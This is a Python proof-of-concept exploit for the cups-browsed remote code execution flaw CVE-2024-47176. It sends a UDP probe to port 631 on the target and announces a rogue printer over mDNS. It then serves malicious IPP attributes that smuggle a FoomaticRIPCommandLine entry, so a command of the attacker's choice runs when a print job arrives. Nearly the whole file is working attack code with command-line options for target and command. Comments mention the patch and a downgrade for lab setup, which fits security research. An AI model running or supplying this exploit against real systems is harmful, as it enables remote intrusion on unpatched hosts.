from uuid import uuid4
from threading import Thread
import threading
import argparse
import socket
import time
from zeroconf import ServiceInfo, Zeroconf
from ippserver.behaviour import StatelessPrinter
from ippserver.server import IPPServer, IPPRequestHandler
from ippserver.constants import (
    OperationEnum, SectionEnum, TagEnum
)
from ippserver.parsers import Enum, Boolean, Integer

# Multicast DNS Discovery
class PrinterZeroConf:
    def __init__(self, name, address, port):
        self.name = name
        self.slug = "".join([c if c.isalnum() else "_" for c in name])
        self.address = address
        self.port = port
        self.zeroconf = None

    def set_service(self):
        return ServiceInfo(
            "_ipp._tcp.local.",
            f"{self.slug}._ipp._tcp.local.",
            addresses=[socket.inet_aton(self.address)],
            port=self.port,
            properties={
                "txtvers": "1",                    
                "qtotal": "1",                     
                "rp": f"printers/{self.name}", 
                "ty": self.name,
                "pdl": "application/postscript,application/pdf",
                "adminurl": f"http://{self.address}:{self.port}",
                "UUID": str(uuid4()),
                "printer-type": "0x000000",
            },
            server=f"{self.slug}.local.",
        )

    def register(self):
        self.zeroconf = Zeroconf()
        self.service_info = self.set_service()
        self.zeroconf.register_service(self.service_info)

    def close(self):
        if self.zeroconf is None:
            return
        self.zeroconf.unregister_service(self.service_info)
        self.zeroconf.close()

    def __del__(self):
        self.close()

# CVE-2024-47176 | Trigger IPP Request/Connection
def send_browsed_packet(ip, port, ipp_server_host, ipp_server_port):
    print("sending udp packet to %s:%d ..." % (ip, port))

    printer_type = 0x00
    printer_state = 0x03
    printer_uri = 'http://%s:%d/printers/RoguePrinter' % (
        ipp_server_host, ipp_server_port)
    printer_location = 'Office HQ'
    printer_info = 'Printer'

    message = bytes('%x %x %s "%s" "%s"' %
                    (printer_type,
                     printer_state,
                     printer_uri,
                     printer_location,
                     printer_info), 'UTF-8')

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(message, (ip, port))

def run_server(server):
    print('malicious ipp server listening on ', server.server_address)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()
    wait_until_ctrl_c()
    server.shutdown()

def wait_until_ctrl_c(t=300):
    try:
        while True:
            time.sleep(t)
    except KeyboardInterrupt:
        return

class RoguePrinter(StatelessPrinter):
    def __init__(self, command, name):
        self.foomaticRipCmd = f'*FoomaticRIPCommandLine: {command} #'
        self.name = name
        super(RoguePrinter, self).__init__()

    def printer_list_attributes(self):
        attr = {
            # rfc2911 section 4.4
            (
                SectionEnum.printer,
                b'printer-uri-supported',
                TagEnum.uri
            ): [self.printer_uri],
            (
                SectionEnum.printer,
                b'uri-security-supported',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'uri-authentication-supported',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'printer-info',
                TagEnum.text_without_language
            ): [b'Printer using ipp-printer.py'],
            (
                SectionEnum.printer,
                b'printer-make-and-model',
                TagEnum.text_without_language
            ): [f'{self.name} 0.00'.encode()],
            (
                SectionEnum.printer,
                b'printer-state',
                TagEnum.enum
            ): [Enum(3).bytes()],  # XXX 3 is idle
            (
                SectionEnum.printer,
                b'printer-state-reasons',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'ipp-versions-supported',
                TagEnum.keyword
            ): [b'1.1'],
            (
                SectionEnum.printer,
                b'operations-supported',
                TagEnum.enum
            ): [
                Enum(x).bytes()
                for x in (
                    OperationEnum.print_job,  # (required by cups)
                    OperationEnum.validate_job,  # (required by cups)
                    OperationEnum.cancel_job,  # (required by cups)
                    OperationEnum.get_job_attributes,  # (required by cups)
                    OperationEnum.get_printer_attributes,
                )],
            (
                SectionEnum.printer,
                b'multiple-document-jobs-supported',
                TagEnum.boolean
            ): [Boolean(False).bytes()],
            (
                SectionEnum.printer,
                b'charset-configured',
                TagEnum.charset
            ): [b'utf-8'],
            (
                SectionEnum.printer,
                b'charset-supported',
                TagEnum.charset
            ): [b'utf-8'],
            (
                SectionEnum.printer,
                b'natural-language-configured',
                TagEnum.natural_language
            ): [b'en'],
            (
                SectionEnum.printer,
                b'generated-natural-language-supported',
                TagEnum.natural_language
            ): [b'en'],
            (
                SectionEnum.printer,
                b'document-format-default',
                TagEnum.mime_media_type
            ): [b'application/pdf'],
            (
                SectionEnum.printer,
                b'document-format-supported',
                TagEnum.mime_media_type
            ): [b'application/pdf'],
            (
                SectionEnum.printer,
                b'printer-is-accepting-jobs',
                TagEnum.boolean
            ): [Boolean(True).bytes()],
            (
                SectionEnum.printer,
                b'queued-job-count',
                TagEnum.integer
            ): [Integer(666).bytes()],
            (
                SectionEnum.printer,
                b'pdl-override-supported',
                TagEnum.keyword
            ): [b'not-attempted'],
            (
                SectionEnum.printer,
                b'printer-up-time',
                TagEnum.integer
            ): [Integer(self.printer_uptime()).bytes()],
            (
                SectionEnum.printer,
                b'compression-supported',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'printer-name',
                TagEnum.name_without_language
            ): [f"{self.name}_1".encode()],
            # --------- **** ---------
            #  Enable media support
            # --------- **** ---------
            (
                SectionEnum.printer,
                b'media-supported',
                TagEnum.keyword
            ): [b'iso_a4_210x297mm'],
            (
                SectionEnum.printer,
                b'media-type-supported',
                TagEnum.keyword
            ): [b'stationery', f': RoguePrinter\n{self.foomaticRipCmd}\n*cupsFilter2: "application/vnd.cups-pdf application/pdf 0 foomatic-rip"\n*%'.encode()],
            # --------- **** ---------
        }
        return attr

    # Ref: https://github.com/h2g2bob/ipp-server/blob/3e4a6d8aad4409c280c6df2d1718b3803e38e813/ippserver/behaviour.py#L409
    # Doesn't seem to be important
    def handle_postscript(self, ipp_request, _postscript_file):
        print("target connected, waiting for print job to trigger payload ...")
        pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--name", default="RoguePrinter")
    parser.add_argument("--lhost", required=True)
    parser.add_argument("--port", type=int, default=12345)
    parser.add_argument("--rhost", required=True)
    parser.add_argument("--command", default="touch /tmp/pwn1")
    args = parser.parse_args()
    command = args.command

    print(f"[!] Command: {command}")
    printer = RoguePrinter(command, args.name)

    # Full exploit chain requires DNS discovery, without it
    # printer will still connect as per 'send_browsed_packet',
    # but commands will not be parsed as expected.
    #---- (zeroconf) multicast DNS Discovery ----#
    discovery = PrinterZeroConf(args.name, args.lhost, args.port)
    
    # Start a discovery thread
    discovery_thread = Thread(target=discovery.register)
    discovery_thread.start()
    #----                ****                ----#

    server = IPPServer((args.lhost, args.port), IPPRequestHandler, printer)
    threading.Thread(
        target=run_server,
        args=(server, )
    ).start()

    # Sends direct probe to target to link to printer
    # Only allows direct connetion, exploit chain won't work without dns discovery
    # ----------------------------------------------------------------------------
    # 1/10/24, Patched from commit: 1d1072a0de573b7850958df614e9ec5b73ea0e0d
    # Use '*packages.txt' to downgrade packages to original
    # Ref: https://openprinting.github.io/OpenPrinting-News-Flash-cups-browsed-Remote-Code-Execution-vulnerability/#what-should-you-do-to-get-protected
    send_browsed_packet(args.rhost, 631, args.lhost, args.port)

    wait_until_ctrl_c(t=1.0)